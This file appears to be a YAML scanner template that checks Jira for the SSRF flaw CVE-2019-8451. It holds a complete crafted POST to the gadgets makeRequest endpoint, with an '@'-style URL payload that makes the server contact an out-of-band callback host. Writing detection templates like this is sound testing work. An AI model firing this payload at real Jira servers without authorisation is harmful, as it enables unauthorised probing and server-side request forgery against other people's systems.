id: jira-ssrf-cve-2019-8451

info:
    name: jira-ssrf-cve-2019-8451
    author: jingling(https://github.com/shmilylty)
    severity: medium

transport: http
set:
    originScheme: request.url.scheme
    originHost: request.url.host
    reverse: newReverse()
    reverseHost: reverse.url.host
    reverseURL: reverse.url.path
rules:
    r0:
        request:
            method: POST
            path: /plugins/servlet/gadgets/makeRequest
            headers:
                X-Atlassian-Token: no-check
            body: |
                url=https://{{originHost}}:443@{{reverseURL}}
        expression: reverse.wait(5)
expression: r0()

